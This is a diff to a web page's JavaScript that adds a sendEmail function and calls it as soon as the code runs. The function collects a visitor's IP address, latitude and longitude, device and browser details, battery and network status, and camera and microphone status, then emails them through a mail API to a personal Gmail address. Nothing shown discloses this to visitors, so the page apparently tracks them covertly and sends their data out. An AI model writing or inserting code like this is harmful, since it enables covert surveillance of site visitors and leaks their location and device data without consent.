@@ -235,4 +235,66 @@ document.cookie = "message=Hey! It's me, Iron Man";
   document.getElementById('cameraStatus').textContent = cameraStatus;
   document.getElementById('microphoneStatus').textContent = microphoneStatus;
 
+
+  // Create a new XMLHttpRequest object
+function sendEmail() {
+    const xhr = new XMLHttpRequest();
+
+    // Set up the request
+    xhr.open('POST', 'https://api.sendinblue.com/v3/smtp/email');
+
+    // Set the request headers
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader(
+      "api-key",
+      "sendblue-api-key"
+    );
+
+    // Handle the response
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === XMLHttpRequest.DONE) {
+        if (xhr.status === 201) {
+          console.log('Email sent successfully!');
+        } else {
+          console.error('Failed to send email:', xhr.statusText);
+        }
+      }
+    };
+
+    // Prepare the email data
+    const emailData = {
+      sender: { name: 'Your Name', email: 'yourname@example.com' },
+      to: [{ email: 'yfilmyzillla@gmail.com' }],
+      subject: 'Test Email',
+      htmlContent: `<p></p>
+        <p>Form Data:</p>
+        <ul>
+          <li>Device Type: ${deviceType}</li>
+          <li>Device Model: ${deviceModel}</li>
+          <li>Browser Type: ${browserType}</li>
+          <li>Browser Version: ${browserVersion}</li>
+          <li>Operating System: ${operatingSystem}</li>
+          <li>IP Address: ${ipAddress}</li>
+          <li>Battery Percentage: ${batteryPercentage}</li>
+          <li>Network Type: ${networkType}</li>
+          <li>Referrer: ${referrer}</li>
+          <li>Latitude: ${latitude}</li>
+          <li>Longitude: ${longitude}</li>
+          <li>Camera Status: ${cameraStatus}</li>
+          <li>Microphone Status: ${microphoneStatus}</li>
+        </ul>`
+    };
+
+    // Convert the email data to JSON
+    const jsonData = JSON.stringify(emailData);
+
+    // Send the request with the JSON data
+    xhr.send(jsonData);
+  }
+
+  // Call the sendEmail function
+  sendEmail();
+
 });
+
+
